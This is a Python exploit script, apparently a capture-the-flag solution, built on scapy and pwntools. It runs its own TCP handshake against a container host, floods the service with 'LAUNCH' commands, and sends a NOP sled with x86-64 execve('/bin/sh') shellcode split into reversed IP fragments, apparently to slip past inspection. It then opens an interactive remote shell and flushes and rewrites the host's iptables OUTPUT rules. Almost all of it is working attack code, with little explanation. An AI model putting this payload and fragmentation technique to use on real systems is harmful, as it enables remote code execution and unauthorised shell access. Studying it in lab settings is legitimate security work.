#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# Author: alex@supernetworks.org <github.com/lts-rad>
'''
Demo of TCP w/ sending fragmented payloads with scapy.

Run this code inside of a namespace/container. Since Linux sends RST for forged SYN packets,
this code will use iptables to block them.

#> iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <src_ip> -j DROP
'''
from scapy.all import *
import logging
from pwn import *

logger = logging.getLogger(__name__)
#logging.basicConfig(level=logging.DEBUG)
#logger.setLevel(logging.DEBUG)

class TcpHandshake(object):

    class RLoop(threading.Thread):
        def __init__(self, tcp):
            threading.Thread.__init__(self)
            self.tcp = tcp

        def handle_recv(self, pkt):
            if pkt and pkt.haslayer(IP) and pkt.haslayer(TCP):
                if pkt[TCP].flags & 0x3f == 0x12:   # SYN+ACK
                    logger.debug("RCV: SYN+ACK")
                    self.tcp.send_synack_ack(pkt)
                    return
                elif  pkt[TCP].flags & 4 != 0:      # RST
                    logger.debug("RCV: RST")
                    #raise Exception("RST")
                    self.tcp.abort = True
                    return
                elif pkt[TCP].flags & 0x1 == 1:     # FIN
                    logger.debug("RCV: FIN")
                    self.tcp.send_finack(pkt)
                    return
                elif pkt[TCP].flags.A: # ACK came in?
                    logger.debug("RCV: ACK")
                    self.tcp.send_base = pkt[TCP].ack

                    logger.debug("RCV: %s"%repr(pkt))
                    if len(pkt[TCP].payload) > 0:
                        self.tcp.Q += [bytes(pkt[TCP].payload)]
                    self.tcp.send_ack(pkt)

                    #great, got an ack, check the send queue for pending data
                    while len(self.tcp.send_queue) > 0:
                        ret = self.tcp.send_data(self.tcp.send_queue.pop(0))
                        if ret == False:
                            break

                    return
                else:
                    logger.debug("? Unhandled packet")
            return


        def run(self):
            ans = sniff(filter="tcp port %s"%self.tcp.target[1], lfilter=self.tcp.match_packet, prn=self.handle_recv, store=False)

    def __init__(self, target, sport=31337):
        self.seq = 0
        self.seq_next = 0
        self.target = target
        self.dst = next(iter(Net(target[0])))
        self.dport = target[1]
        self.sport = sport #random.randrange(0, 2**16)
        self.seq_start = random.randrange(0, 2**32)
        # options=[('WScale', 7)]
        self.l4 = IP(version=4,dst=target[0])/TCP(sport=self.sport, dport=self.dport, flags=0,
                                        seq=self.seq_start, window=65535)
        self.src = self.l4.src
        self.Q = []
        self.abort = False


        self.send_base = self.l4[TCP].seq
        self.send_window = self.l4[TCP].window
        self.last_sent = self.send_base
        self.send_queue = []

        self.last_ack  = 0

        #let underlying handle ethernet
        self.s = conf.L3socket()

        self.R = self.RLoop(self)
        self.R.start()
        logger.debug("init: %s"%repr(target))

    def start(self):
        logger.debug("start")
        return self.send_syn()

    def match_packet(self, pkt):
        if pkt.haslayer(IP) and pkt[IP].dst == self.l4[IP].src \
           and pkt.haslayer(TCP) and pkt[TCP].dport == self.sport:
           if pkt[TCP].ack <= self.seq_next and pkt[TCP].ack >= self.seq_start:
               return True
           else:
               logger.debug("ack was %d expected %d" % (pkt[TCP].ack, self.seq_next))
        return False

    def send_syn(self):
        logger.debug("SND: SYN")
        self.l4[TCP].flags = "S"
        self.seq_next = self.l4[TCP].seq + 1
        self.s.send(self.l4)
        self.l4[TCP].seq += 1

    def send_synack_ack(self, pkt):
        logger.debug("SND: SYN+ACK -> ACK with ack # %d" % (pkt[TCP].seq + 1))
        self.l4[TCP].ack = pkt[TCP].seq + 1
        self.l4[TCP].flags = "A"
        self.seq_next = self.l4[TCP].seq
        self.s.send(self.l4)

    def send_data(self, d):
        if self.abort == True:
            print("[-] not sending data, aborted !!!")
            return False
        self.l4[TCP].flags = "PA"

        available = self.send_base + self.send_window - self.last_sent

        if available == 0:
            self.send_queue += [d]
            # have to wait
            return False
        assert available >= 0

        if available < len(d):
            d, chop = d[:available], d[available:]
            self.send_queue += [chop]

        self.seq_next = self.l4[TCP].seq + len(d)
        self.last_sent = self.seq_next
        tosend = self.l4/d

        self.s.send(tosend)
        self.l4[TCP].seq += len(d)
        return True

    def send_frag_data(self, d, sz):
        if self.abort == True:
            print("[-] not sending data, aborted !!!")
            return
        assert sz >= 8
        self.l4[TCP].flags = "PA"

        #tbd send window handling for fragments(?)
        dat = self.l4/d
        fragments = fragment(dat, sz)
        for f in fragments[::-1]:
            self.s.send(f)

        self.seq_next = self.l4[TCP].seq + len(d)
        self.last_sent = self.seq_next
        self.l4[TCP].seq += len(d)
        return True

    def send_fin(self):
        logger.debug("SND: FIN")
        self.l4[TCP].flags = "F"
        self.seq_next = self.l4[TCP].seq + 1
        self.s.send(self.l4)
        self.l4[TCP].seq += 1

    def send_rst(self):
        logger.debug("SND: RST")
        self.l4[TCP].flags = "R"
        self.seq_next = self.l4[TCP].seq + 1
        self.s.send(self.l4)
        self.l4[TCP].seq += 1

    def send_finack(self, pkt):
        logger.debug("SND: FIN+ACK")
        self.l4[TCP].flags = "FA"
        self.l4[TCP].ack = pkt[TCP].seq + 1
        self.seq_next = self.l4[TCP].seq + 1
        self.s.send(self.l4)
        self.l4[TCP].seq += 1
        #raise Exception("FIN+ACK")
        self.abort = True

    def send_ack(self, pkt):
        self.l4[TCP].flags = "A"

        self.last_ack = pkt[TCP].ack
        to_acknowledge = len(pkt[TCP].payload)
        #logger.debug("SND: ACK with ack # %d" % (pkt[TCP].seq + len(pkt[TCP].load)))

        if to_acknowledge != 0:
            self.l4[TCP].ack = pkt[TCP].seq + to_acknowledge
            self.s.send(self.l4)

    def recv(self, timeout):
        elapsed = 0
        while (timeout != 0) and (elapsed < timeout):
            if len(self.Q) > 0:
                retval = self.Q.pop(0)
                return retval
            time.sleep(0.01)
            elapsed += 0.
        #returning nothing
        return ""

    def clear_recv(self):
        self.Q = []

    def wait_all_acks(self, timeout=0):
        elapsed = 0
        delta = 0.1
        while (timeout != 0) and (elapsed < timeout):
            if self.last_ack == self.seq_next and len(self.send_queue) == 0:
                return True
            time.sleep(delta)
            elapsed += delta
        return False



if __name__== '__main__':

    sport = random.randint(40000, 60000)
    os.system("iptables -F OUTPUT")
    os.system("iptables -A OUTPUT -p tcp --sport %d --tcp-flags RST RST -j DROP"%sport)
    conf.verb = 0

    tcp_hs = TcpHandshake(("172.17.0.2", 31337), sport=sport)

    r = tubes.sock.sock()
    r.send = tcp_hs.send_data
    r.recv = tcp_hs.recv
    tcp_hs.start()

    tosend = b""
    def nuke(offset):
        global tosend
        # scapy send is slow. to speed it up,
        # chunk the commands
        if len(tosend) > 400:
            r.send(tosend)
            tosend = b""

        tosend += b'LAUNCH %d,%d\n'%(offset%0x10,offset//0x10)

    def nukes(a, b):
        for i in range(a, b):
            nuke(i)


    nukes(0, 0x40)
    nukes(0x50, 0x58)
    nukes(0x5b, 0x60)
    nukes(0x70, 0xb0)
    nukes(0xc0, 0xc3)

    nukes(0xc6, 0xc7)
    nukes(0xca, 0xd0)
    nuke(0xdc)
    nukes(0xe0, 0xec)
    nukes(0xed, 0xf0)

    nukes(0x108, 0x10c)
    nukes(0x10d, 0x473)
    nukes(0x495, 0xc17)
    nuke(0)

    if tosend:
        r.send(tosend)

    tosend = b'ENDTEST\n'
    r.send(tosend)

    context.arch = 'amd64'
    sc = b'\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

    print("******** sending shellcode ***********")
    d = b'\x90' * (0xd00+200) + sc

    tcp_hs.send_frag_data(d, 100)
    #raw_input()

    r.recvuntil(b'ENDTEST')

    #raw_input("Ready?")
    print("Waiting for data to come in...")
    time.sleep(2)
    tcp_hs.clear_recv()
    print("[+] Good")

    try:
        r.interactive()
    except:
        print('aborted')

    print("over")
    raw_input()
    os.system("iptables -F OUTPUT")
    tcp_hs.send_fin()
    tcp_hs.send_rst()
